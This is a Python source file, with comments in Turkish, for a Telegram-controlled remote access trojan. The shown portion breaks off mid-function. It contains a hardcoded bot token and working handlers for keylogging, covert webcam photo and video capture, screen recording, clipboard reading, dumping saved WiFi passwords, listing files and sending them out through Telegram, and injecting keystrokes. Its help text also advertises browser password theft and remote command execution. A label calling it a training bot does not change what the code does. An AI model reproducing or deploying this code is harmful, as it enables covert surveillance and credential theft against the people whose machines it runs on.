import telebot
import socket
import datetime
import cv2
import numpy as np
import pyautogui
import requests
import platform
import os
import subprocess
import psutil
import shutil
import json
import sqlite3
import base64
import ctypes
from io import BytesIO
from pynput import keyboard
from pynput.mouse import Button
import threading
import pyperclip
import time
import glob
import webbrowser
import urllib.parse

# Bot ayarları
API_KEY = "8242613283:AAGR0NZl35gTo9KdcnOABRg2GPCVKuwC_-w"
CHAT_ID = 6528811086
bot = telebot.TeleBot(API_KEY)

# Keylogger değişkenleri
keylogger_active = False
keylogger_listener = None
keylog_file = "keylog.txt"

def check_authorized(message):
    """Sadece yetkili kullanıcının komutları çalıştırmasını sağlar"""
    # Forum topic mesajlarını tamamen görmezden gel
    if hasattr(message, 'message_thread_id') and message.message_thread_id is not None:
        return False
    return message.chat.id == CHAT_ID

def on_key_press(key):
    """Klavye tuşuna basıldığında çağrılır"""
    global keylogger_active
    if not keylogger_active:
        return
    
    try:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Özel tuşları kontrol et
        if hasattr(key, 'char') and key.char is not None:
            # Normal karakter
            key_data = f"[{timestamp}] {key.char}\n"
        elif key == keyboard.Key.space:
            key_data = f"[{timestamp}] [SPACE]\n"
        elif key == keyboard.Key.enter:
            key_data = f"[{timestamp}] [ENTER]\n"
        elif key == keyboard.Key.backspace:
            key_data = f"[{timestamp}] [BACKSPACE]\n"
        elif key == keyboard.Key.tab:
            key_data = f"[{timestamp}] [TAB]\n"
        elif key == keyboard.Key.shift:
            key_data = f"[{timestamp}] [SHIFT]\n"
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            key_data = f"[{timestamp}] [CTRL]\n"
        elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
            key_data = f"[{timestamp}] [ALT]\n"
        elif key == keyboard.Key.esc:
            key_data = f"[{timestamp}] [ESC]\n"
        else:
            key_data = f"[{timestamp}] [{str(key)}]\n"
        
        # Dosyaya yaz
        with open(keylog_file, "a", encoding="utf-8") as f:
            f.write(key_data)
            
    except Exception as e:
        pass  # Hataları sessizce geç

def start_keylogger():
    """Keylogger'ı başlatır"""
    global keylogger_active, keylogger_listener
    
    if keylogger_active:
        return False
    
    try:
        # Eski log dosyasını temizle veya yeni oluştur
        if os.path.exists(keylog_file):
            with open(keylog_file, "w", encoding="utf-8") as f:
                f.write(f"=== Keylogger Başlatıldı: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n\n")
        else:
            with open(keylog_file, "w", encoding="utf-8") as f:
                f.write(f"=== Keylogger Başlatıldı: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n\n")
        
        keylogger_active = True
        keylogger_listener = keyboard.Listener(on_press=on_key_press)
        keylogger_listener.start()
        return True
    except Exception as e:
        return False

def stop_keylogger():
    """Keylogger'ı durdurur"""
    global keylogger_active, keylogger_listener
    
    if not keylogger_active:
        return False
    
    try:
        keylogger_active = False
        if keylogger_listener:
            keylogger_listener.stop()
            keylogger_listener = None
        
        # Log dosyasına bitiş zamanını ekle
        if os.path.exists(keylog_file):
            with open(keylog_file, "a", encoding="utf-8") as f:
                f.write(f"\n=== Keylogger Durduruldu: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
        
        return True
    except Exception as e:
        return False

@bot.message_handler(commands=['start'])
def start(message):
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    welcome_text = """
🤖 Eğitim Botu Aktif!

📸 KAMERA & EKRAN:
/kamerafoto - Kameradan fotoğraf çek
/kameravideo - 5 saniye video kaydet
/ekranfoto - Ekran görüntüsü al
/ekrankayit - Ekran kaydı (10 saniye)

🔍 BİLGİ & SİSTEM:
/bilgiip - IP ve sistem bilgilerini göster
/processlist - Çalışan programları listele
/wifi - WiFi şifrelerini göster
/clipboard - Panodaki metni göster
/sistemdetay - Detaylı sistem bilgisi
/diskbilgi - Disk kullanımı
/ramcpu - RAM ve CPU kullanımı
/portlar - Açık portlar
/usbcihazlar - USB cihazlar
/servisler - Sistem servisleri

⌨️ KEYLOGGER:
/keyloggerstart - Keylogger'ı başlat
/keyloggerstop - Keylogger'ı durdur
/keyloggerlog - Kaydedilen logları gönder

📁 DOSYA İŞLEMLERİ:
/dosyalist - Dosyaları listele
/dosyaindir - Dosya indir
/dosyasil - Dosya sil
/dosyaara - Dosya ara
/dosyaoku - Dosya içeriğini oku

🌐 TARAYICI & ŞİFRELER:
/sifreler - Kayıtlı şifreler
/gecmis - Tarayıcı geçmişi
/webekran - Web sitesi ekran görüntüsü

🖱️ KONTROL:
/klavye - Klavye tuşu gönder
/fare - Fare konumunu göster
/farehareket - Fareyi hareket ettir
/faretikla - Fare tıkla
/ekrankilitle - Ekranı kilitle
/komutcalistir - Komut çalıştır
/kapat - Bilgisayarı kapat
/yenidenbaslat - Bilgisayarı yeniden başlat

🎤 SES & EKRAN:
/mikrofon - Mikrofon kaydı (5 saniye)
/ekranparlaklik - Ekran parlaklığı ayarla
/sesduzeyi - Ses seviyesi ayarla

📤 DOSYA & AĞ:
/dosyayukle - Telegram'dan dosya yükle
/agbilgisi - Ağ bağlantı bilgileri
/pencerebilgi - Aktif pencere bilgisi

🪟 PENCERE KONTROLÜ:
/tumpencereler - Tüm açık pencereler
/pencerekapat - Aktif pencereyi kapat
/pencerebuyut - Pencereyi büyüt
/pencerekucult - Pencereyi küçült
/pencereaktif - Pencereyi aktif et

📁 GELİŞMİŞ DOSYA:
/dosyayenidenadlandir - Dosya yeniden adlandır
/dosyakopyala - Dosya kopyala
/dosyatasima - Dosya taşı
/klasorolustur - Klasör oluştur
/dosyaboyutu - Dosya boyutu

🖱️ GELİŞMİŞ FARE:
/farecift - Çift tıklama
/faresurukle - Fare sürükle
/klavyekisa - Klavye kısayolu

⚙️ SİSTEM:
/sistemzaman - Sistem zamanı
/kullanicilar - Sistem kullanıcıları
/oturumac - Yeni oturum aç
/tarayiciac - Tarayıcı aç
/uygulamaac - Uygulama aç
/ekrancozunurluk - Ekran çözünürlüğü
/ekranbekleme - Ekranı uyku moduna al
/islemcidetay - İşlemci detayları
/bellekdetay - Bellek detayları

📋 YARDIM:
/yardim - Tüm komutları listele
/komutlar - Hızlı komut listesi
    """
    bot.reply_to(message, welcome_text)

@bot.message_handler(commands=['yardim', 'help'])
def help_command(message):
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    help_text = """
📋 TÜM KOMUTLAR (60+):

📸 KAMERA & EKRAN:
/kamerafoto - Webcam'den fotoğraf çeker
/kameravideo - 5 saniye video kaydeder
/ekranfoto - Ekran görüntüsü alır
/ekrankayit - 10 saniye ekran kaydı yapar

🔍 BİLGİ & SİSTEM:
/bilgiip - IP adresi ve sistem bilgilerini gösterir
/processlist - Çalışan tüm programları listeler
/wifi - Kayıtlı WiFi şifrelerini gösterir
/clipboard - Panodaki (kopyalanan) metni gösterir
/sistemdetay - Detaylı sistem bilgileri (CPU, RAM, Disk)
/diskbilgi - Tüm disklerin kullanım bilgisi
/ramcpu - RAM ve CPU kullanım yüzdesi
/portlar - Açık portlar ve bağlantılar
/usbcihazlar - Bağlı USB cihazları listeler
/servisler - Sistem servislerini gösterir

⌨️ KEYLOGGER (Eğitim Amaçlı):
/keyloggerstart - Keylogger'ı başlatır
/keyloggerstop - Keylogger'ı durdurur
/keyloggerlog - Kaydedilen tuş vuruşlarını gönderir

📁 DOSYA İŞLEMLERİ:
/dosyalist [klasör] - Belirtilen klasördeki dosyaları listeler
/dosyaindir [dosya_yolu] - Dosyayı Telegram'a gönderir (max 50MB)
/dosyasil [dosya_yolu] - Dosya veya klasör siler
/dosyaara [isim] - Bilgisayarda dosya arar
/dosyaoku [dosya_yolu] - Dosya içeriğini okur (max 5MB)

🌐 TARAYICI & ŞİFRELER:
/sifreler - Chrome/Edge kayıtlı şifrelerini gösterir
/gecmis - Tarayıcı geçmişini listeler
/webekran [url] - Web sitesi ekran görüntüsü alır

🖱️ KONTROL:
/klavye [metin] - Klavyeden metin yazar
/fare - Fare konumunu gösterir
/farehareket [x] [y] - Fareyi belirtilen konuma taşır
/faretikla [sol/sag] - Fare tıklaması yapar
/ekrankilitle - Ekranı kilitler
/komutcalistir [komut] - Komut satırı komutu çalıştırır
/kapat - Bilgisayarı 10 saniye içinde kapatır
/yenidenbaslat - Bilgisayarı 10 saniye içinde yeniden başlatır

/start - Botu başlatır
/yardim - Detaylı yardım mesajı
/komutlar - Hızlı komut listesi
    """
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['kamerafoto'])
def take_camera_photo(message):
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        bot.reply_to(message, "📸 Kameradan fotoğraf çekiliyor...")
        
        # Kamerayı aç
        cam = cv2.VideoCapture(0)
        
        if not cam.isOpened():
            bot.reply_to(message, "❌ Kamera bulunamadı veya erişilemiyor!")
            return
        
        # Fotoğraf çek
        ret, frame = cam.read()
        cam.release()
        
        if ret:
            # Fotoğrafı geçici olarak kaydet
            photo_path = "temp_camera_photo.jpg"
            cv2.imwrite(photo_path, frame)
            
            # Fotoğrafı gönder
            with open(photo_path, 'rb') as photo:
                bot.send_photo(message.chat.id, photo, caption="📸 Kameradan çekilen fotoğraf")
            
            # Geçici dosyayı sil
            if os.path.exists(photo_path):
                os.remove(photo_path)
        else:
            bot.reply_to(message, "❌ Fotoğraf çekilemedi!")
            
    except Exception as e:
        bot.reply_to(message, f"❌ Hata oluştu: {str(e)}")

@bot.message_handler(commands=['ekranfoto'])
def take_screenshot(message):
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        bot.reply_to(message, "🖥️ Ekran görüntüsü alınıyor...")
        
        # Ekran görüntüsü al
        screenshot = pyautogui.screenshot()
        
        # Geçici dosya olarak kaydet
        screenshot_path = "temp_screenshot.png"
        screenshot.save(screenshot_path)
        
        # Ekran görüntüsünü gönder
        with open(screenshot_path, 'rb') as photo:
            bot.send_photo(message.chat.id, photo, caption="🖥️ Ekran görüntüsü")
        
        # Geçici dosyayı sil
        if os.path.exists(screenshot_path):
            os.remove(screenshot_path)
            
    except Exception as e:
        bot.reply_to(message, f"❌ Hata oluştu: {str(e)}")

@bot.message_handler(commands=['bilgiip'])
def send_ip_info(message):
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        # IP bilgisi
        try:
            public_ip = requests.get("https://api.ipify.org", timeout=5).text
        except:
            public_ip = "Alınamadı"
        
        # Yerel IP
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
        except:
            local_ip = "Alınamadı"
            hostname = "Bilinmiyor"
        
        # Sistem bilgileri
        system_info = platform.system()
        system_release = platform.release()
        system_version = platform.version()
        processor = platform.processor()
        machine = platform.machine()
        
        # Tarih ve saat
        now = datetime.datetime.now()
        date_time = now.strftime("%d/%m/%Y %H:%M:%S")
        
        # Bilgileri formatla
        info_text = f"""
🌐 IP BİLGİLERİ
━━━━━━━━━━━━━━━━━━━━
🌍 Genel IP: {public_ip}
🏠 Yerel IP: {local_ip}
🖥️ Bilgisayar Adı: {hostname}

💻 SİSTEM BİLGİLERİ
━━━━━━━━━━━━━━━━━━━━
🪟 İşletim Sistemi: {system_info} {system_release}
📦 Sistem Versiyonu: {system_version}
⚙️ İşlemci: {processor}
🔧 Makine: {machine}

🕐 TARİH/SAAT
━━━━━━━━━━━━━━━━━━━━
📅 {date_time}
        """
        
        bot.reply_to(message, info_text)
        
    except Exception as e:
        bot.reply_to(message, f"❌ Hata oluştu: {str(e)}")

@bot.message_handler(commands=['keyloggerstart'])
def handle_keylogger_start(message):
    """Keylogger'ı başlatır"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        if keylogger_active:
            bot.reply_to(message, "⚠️ Keylogger zaten çalışıyor!")
        else:
            if start_keylogger():
                bot.reply_to(message, "✅ Keylogger başlatıldı! Tuş vuruşları kaydediliyor...")
            else:
                bot.reply_to(message, "❌ Keylogger başlatılamadı!")
    except Exception as e:
        bot.reply_to(message, f"❌ Hata oluştu: {str(e)}")

@bot.message_handler(commands=['keyloggerstop'])
def handle_keylogger_stop(message):
    """Keylogger'ı durdurur"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        if not keylogger_active:
            bot.reply_to(message, "⚠️ Keylogger zaten durdurulmuş!")
        else:
            if stop_keylogger():
                bot.reply_to(message, "🛑 Keylogger durduruldu!")
            else:
                bot.reply_to(message, "❌ Keylogger durdurulamadı!")
    except Exception as e:
        bot.reply_to(message, f"❌ Hata oluştu: {str(e)}")

@bot.message_handler(commands=['keyloggerlog'])
def handle_keylogger_log(message):
    """Keylogger loglarını gönderir"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        if not os.path.exists(keylog_file):
            bot.reply_to(message, "❌ Henüz log dosyası oluşturulmamış!")
            return
        
        with open(keylog_file, "r", encoding="utf-8") as f:
            log_content = f.read()
        
        if not log_content or len(log_content.strip()) == 0:
            bot.reply_to(message, "📝 Log dosyası boş!")
            return
        
        # Telegram mesaj limiti 4096 karakter, daha uzunsa dosya olarak gönder
        if len(log_content) > 4000:
            bot.reply_to(message, "📄 Log dosyası çok büyük, dosya olarak gönderiliyor...")
            bot.send_document(message.chat.id, open(keylog_file, 'rb'), caption="📝 Keylogger Log Dosyası")
        else:
            status = "🟢 Aktif" if keylogger_active else "🔴 Durduruldu"
            bot.reply_to(message, f"📝 Keylogger Logları ({status}):\n\n```\n{log_content}\n```", parse_mode='Markdown')
                    
    except Exception as e:
        bot.reply_to(message, f"❌ Log okunamadı: {str(e)}")

@bot.message_handler(commands=['kameravideo'])
def take_camera_video(message):
    """Kameradan kısa video kaydeder"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        bot.reply_to(message, "🎥 5 saniye video kaydediliyor...")
        
        cam = cv2.VideoCapture(0)
        if not cam.isOpened():
            bot.reply_to(message, "❌ Kamera bulunamadı!")
            return
        
        # Video ayarları
        fps = 20.0
        width = int(cam.get(cv2.CAP_PROP_FRAME_WIDTH))
        height = int(cam.get(cv2.CAP_PROP_FRAME_HEIGHT))
        video_path = "temp_video.avi"
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(video_path, fourcc, fps, (width, height))
        
        # 5 saniye kayıt
        start_time = time.time()
        while time.time() - start_time < 5:
            ret, frame = cam.read()
            if ret:
                out.write(frame)
            time.sleep(1/fps)
        
        cam.release()
        out.release()
        
        # Video gönder
        if os.path.exists(video_path):
            with open(video_path, 'rb') as video:
                bot.send_video(message.chat.id, video, caption="🎥 Kameradan kaydedilen video")
            os.remove(video_path)
        else:
            bot.reply_to(message, "❌ Video kaydedilemedi!")
            
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['processlist'])
def list_processes(message):
    """Çalışan process'leri listeler"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        bot.reply_to(message, "📋 Çalışan programlar listeleniyor...")
        
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'memory_info']):
            try:
                processes.append({
                    'name': proc.info['name'],
                    'pid': proc.info['pid'],
                    'memory': proc.info['memory_info'].rss / 1024 / 1024  # MB
                })
            except:
                pass
        
        # Memory'ye göre sırala
        processes.sort(key=lambda x: x['memory'], reverse=True)
        
        # İlk 20 process'i göster
        process_text = "📋 ÇALIŞAN PROGRAMLAR (Top 20)\n━━━━━━━━━━━━━━━━━━━━\n\n"
        for i, proc in enumerate(processes[:20], 1):
            process_text += f"{i}. {proc['name']}\n"
            process_text += f"   PID: {proc['pid']} | RAM: {proc['memory']:.2f} MB\n\n"
        
        if len(process_text) > 4000:
            # Dosya olarak gönder
            with open("process_list.txt", "w", encoding="utf-8") as f:
                f.write(process_text)
            bot.send_document(message.chat.id, open("process_list.txt", 'rb'), caption="📋 Process Listesi")
            os.remove("process_list.txt")
        else:
            bot.reply_to(message, process_text)
            
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['wifi'])
def show_wifi_passwords(message):
    """WiFi şifrelerini gösterir (Windows)"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        bot.reply_to(message, "📶 WiFi şifreleri alınıyor...")
        
        # Windows için netsh komutu
        result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], 
                              capture_output=True, text=True, encoding='utf-8')
        
        if result.returncode != 0:
            bot.reply_to(message, "❌ WiFi profilleri alınamadı!")
            return
        
        # Profil isimlerini çıkar
        profiles = []
        for line in result.stdout.split('\n'):
            if 'All User Profile' in line or 'Tüm Kullanıcı Profili' in line:
                profile_name = line.split(':')[-1].strip()
                profiles.append(profile_name)
        
        if not profiles:
            bot.reply_to(message, "❌ Kayıtlı WiFi profili bulunamadı!")
            return
        
        wifi_text = "📶 KAYITLI WiFi ŞİFRELERİ\n━━━━━━━━━━━━━━━━━━━━\n\n"
        
        for profile in profiles:
            try:
                # Her profil için şifreyi al
                cmd = ['netsh', 'wlan', 'show', 'profile', f'name={profile}', 'key=clear']
                result = subprocess.run(cmd, capture_output=True, text=True, encoding='utf-8')
                
                password = "Bulunamadı"
                for line in result.stdout.split('\n'):
                    if 'Key Content' in line or 'Anahtar İçeriği' in line:
                        password = line.split(':')[-1].strip()
                        break
                
                wifi_text += f"📡 {profile}\n🔑 Şifre: {password}\n\n"
            except:
                wifi_text += f"📡 {profile}\n🔑 Şifre: Alınamadı\n\n"
        
        if len(wifi_text) > 4000:
            with open("wifi_passwords.txt", "w", encoding="utf-8") as f:
                f.write(wifi_text)
            bot.send_document(message.chat.id, open("wifi_passwords.txt", 'rb'), caption="📶 WiFi Şifreleri")
            os.remove("wifi_passwords.txt")
        else:
            bot.reply_to(message, wifi_text)
            
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['clipboard'])
def show_clipboard(message):
    """Panodaki metni gösterir"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        clipboard_text = pyperclip.paste()
        
        if not clipboard_text:
            bot.reply_to(message, "📋 Pano boş!")
        else:
            if len(clipboard_text) > 4000:
                bot.reply_to(message, "📋 Pano içeriği çok uzun, dosya olarak gönderiliyor...")
                with open("clipboard.txt", "w", encoding="utf-8") as f:
                    f.write(clipboard_text)
                bot.send_document(message.chat.id, open("clipboard.txt", 'rb'), caption="📋 Pano İçeriği")
                os.remove("clipboard.txt")
            else:
                bot.reply_to(message, f"📋 Pano İçeriği:\n\n```\n{clipboard_text}\n```", parse_mode='Markdown')
                
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['dosyalist'])
def list_files(message):
    """Belirtilen klasördeki dosyaları listeler"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        # Komut argümanını al
        command_text = message.text.split(' ', 1)
        folder_path = command_text[1] if len(command_text) > 1 else os.getcwd()
        
        if not os.path.exists(folder_path):
            bot.reply_to(message, f"❌ Klasör bulunamadı: {folder_path}")
            return
        
        if not os.path.isdir(folder_path):
            bot.reply_to(message, f"❌ Bu bir klasör değil: {folder_path}")
            return
        
        files_list = []
        try:
            for item in os.listdir(folder_path):
                item_path = os.path.join(folder_path, item)
                if os.path.isfile(item_path):
                    size = os.path.getsize(item_path)
                    size_mb = size / 1024 / 1024
                    files_list.append(f"📄 {item} ({size_mb:.2f} MB)")
                elif os.path.isdir(item_path):
                    files_list.append(f"📁 {item}/")
        except PermissionError:
            bot.reply_to(message, "❌ Bu klasöre erişim izni yok!")
            return
        
        if not files_list:
            bot.reply_to(message, f"📁 Klasör boş: {folder_path}")
            return
        
        files_text = f"📁 DOSYALAR: {folder_path}\n━━━━━━━━━━━━━━━━━━━━\n\n"
        files_text += "\n".join(files_list[:50])  # İlk 50 dosya
        
        if len(files_list) > 50:
            files_text += f"\n\n... ve {len(files_list) - 50} dosya daha"
        
        if len(files_text) > 4000:
            with open("file_list.txt", "w", encoding="utf-8") as f:
                f.write(files_text)
            bot.send_document(message.chat.id, open("file_list.txt", 'rb'), caption="📁 Dosya Listesi")
            os.remove("file_list.txt")
        else:
            bot.reply_to(message, files_text)
            
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['dosyaindir'])
def download_file(message):
    """Dosyayı Telegram'a gönderir"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        # Komut argümanını al
        command_text = message.text.split(' ', 1)
        if len(command_text) < 2:
            bot.reply_to(message, "❓ Kullanım: /dosyaindir [dosya_yolu]")
            return
        
        file_path = command_text[1].strip()
        
        if not os.path.exists(file_path):
            bot.reply_to(message, f"❌ Dosya bulunamadı: {file_path}")
            return
        
        if not os.path.isfile(file_path):
            bot.reply_to(message, f"❌ Bu bir dosya değil: {file_path}")
            return
        
        # Dosya boyutu kontrolü (50MB limit)
        file_size = os.path.getsize(file_path) / 1024 / 1024
        if file_size > 50:
            bot.reply_to(message, f"❌ Dosya çok büyük! (50MB limit)")
            return
        
        bot.reply_to(message, f"📤 Dosya gönderiliyor... ({file_size:.2f} MB)")
        
        with open(file_path, 'rb') as f:
            bot.send_document(message.chat.id, f, caption=f"📄 {os.path.basename(file_path)}")
            
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['klavye'])
def send_keyboard(message):
    """Klavyeden metin yazar"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        command_text = message.text.split(' ', 1)
        if len(command_text) < 2:
            bot.reply_to(message, "❓ Kullanım: /klavye [yazılacak_metin]")
            return
        
        text_to_type = command_text[1]
        
        # 3 saniye bekle (kullanıcı hazır olsun)
        bot.reply_to(message, f"⌨️ 3 saniye sonra klavyeden yazılacak: {text_to_type[:50]}...")
        time.sleep(3)
        
        # Metni yaz
        pyautogui.write(text_to_type, interval=0.05)
        bot.reply_to(message, "✅ Metin yazıldı!")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['fare'])
def show_mouse_position(message):
    """Fare konumunu gösterir"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        x, y = pyautogui.position()
        screen_width, screen_height = pyautogui.size()
        
        mouse_info = f"""
🖱️ FARE KONUMU
━━━━━━━━━━━━━━━━━━━━
📍 X: {x} / {screen_width}
📍 Y: {y} / {screen_height}
📐 Ekran: {screen_width}x{screen_height}
        """
        
        bot.reply_to(message, mouse_info)
        
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['ekrankayit'])
def record_screen(message):
    """Ekran kaydı yapar"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        bot.reply_to(message, "🎬 10 saniye ekran kaydı başlıyor...")
        
        # Ekran boyutu
        screen_width, screen_height = pyautogui.size()
        fps = 10.0
        video_path = "temp_screen_record.avi"
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(video_path, fourcc, fps, (screen_width, screen_height))
        
        # 10 saniye kayıt
        start_time = time.time()
        while time.time() - start_time < 10:
            screenshot = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)
            out.write(frame)
            time.sleep(1/fps)
        
        out.release()
        
        if os.path.exists(video_path):
            with open(video_path, 'rb') as video:
                bot.send_video(message.chat.id, video, caption="🎬 Ekran kaydı (10 saniye)")
            os.remove(video_path)
        else:
            bot.reply_to(message, "❌ Video kaydedilemedi!")
            
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['sistemdetay'])
def system_details(message):
    """Detaylı sistem bilgileri"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        # CPU bilgileri
        cpu_percent = psutil.cpu_percent(interval=1)
        cpu_count = psutil.cpu_count()
        cpu_freq = psutil.cpu_freq()
        
        # RAM bilgileri
        ram = psutil.virtual_memory()
        ram_total = ram.total / 1024 / 1024 / 1024  # GB
        ram_used = ram.used / 1024 / 1024 / 1024
        ram_percent = ram.percent
        
        # Disk bilgileri
        disk = psutil.disk_usage('/')
        disk_total = disk.total / 1024 / 1024 / 1024
        disk_used = disk.used / 1024 / 1024 / 1024
        disk_percent = disk.percent
        
        # Ağ bilgileri
        net_io = psutil.net_io_counters()
        
        # Boot zamanı
        boot_time = datetime.datetime.fromtimestamp(psutil.boot_time())
        
        details = f"""
💻 DETAYLI SİSTEM BİLGİLERİ
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🖥️ İŞLEMCİ (CPU)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 Kullanım: {cpu_percent}%
🔢 Çekirdek: {cpu_count}
⚡ Frekans: {cpu_freq.current:.2f} MHz

💾 BELLEK (RAM)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 Kullanım: {ram_percent}%
💿 Toplam: {ram_total:.2f} GB
📈 Kullanılan: {ram_used:.2f} GB
📉 Boş: {ram_total - ram_used:.2f} GB

💿 DİSK
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 Kullanım: {disk_percent}%
💿 Toplam: {disk_total:.2f} GB
📈 Kullanılan: {disk_used:.2f} GB
📉 Boş: {disk_total - disk_used:.2f} GB

🌐 AĞ
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⬆️ Gönderilen: {net_io.bytes_sent / 1024 / 1024:.2f} MB
⬇️ Alınan: {net_io.bytes_recv / 1024 / 1024:.2f} MB

⏰ SİSTEM
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🕐 Açılış Zamanı: {boot_time.strftime('%d/%m/%Y %H:%M:%S')}
⏱️ Çalışma Süresi: {str(datetime.timedelta(seconds=int(time.time() - psutil.boot_time())))}
        """
        
        bot.reply_to(message, details)
        
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['diskbilgi'])
def disk_info(message):
    """Disk kullanım bilgileri"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        partitions = psutil.disk_partitions()
        disk_info_text = "💿 DİSK BİLGİLERİ\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        
        for partition in partitions:
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                total = usage.total / 1024 / 1024 / 1024
                used = usage.used / 1024 / 1024 / 1024
                free = usage.free / 1024 / 1024 / 1024
                percent = usage.percent
                
                disk_info_text += f"📀 {partition.device}\n"
                disk_info_text += f"   Tip: {partition.fstype}\n"
                disk_info_text += f"   Toplam: {total:.2f} GB\n"
                disk_info_text += f"   Kullanılan: {used:.2f} GB ({percent}%)\n"
                disk_info_text += f"   Boş: {free:.2f} GB\n\n"
            except:
                pass
        
        bot.reply_to(message, disk_info_text)
        
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['ramcpu'])
def ram_cpu_usage(message):
    """RAM ve CPU kullanımını gösterir"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        # CPU
        cpu_percent = psutil.cpu_percent(interval=1, percpu=True)
        cpu_avg = psutil.cpu_percent(interval=1)
        
        # RAM
        ram = psutil.virtual_memory()
        
        usage_text = f"""
📊 RAM & CPU KULLANIMI
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚡ CPU: {cpu_avg}%
   Çekirdekler: {', '.join([f'{c:.1f}%' for c in cpu_percent])}

💾 RAM: {ram.percent}%
   Kullanılan: {ram.used / 1024 / 1024 / 1024:.2f} GB
   Toplam: {ram.total / 1024 / 1024 / 1024:.2f} GB
   Boş: {ram.available / 1024 / 1024 / 1024:.2f} GB
        """
        
        bot.reply_to(message, usage_text)
        
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['portlar'])
def show_ports(message):
    """Açık portları gösterir"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        connections = psutil.net_connections(kind='inet')
        ports_text = "🔌 AÇIK PORTLAR\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        
        port_list = []
        for conn in connections[:30]:  # İlk 30
            if conn.status == 'ESTABLISHED' or conn.status == 'LISTEN':
                port_list.append(f"🔹 Port {conn.laddr.port} - {conn.status} - PID: {conn.pid}")
        
        if port_list:
            ports_text += "\n".join(port_list)
        else:
            ports_text += "Açık port bulunamadı."
        
        if len(ports_text) > 4000:
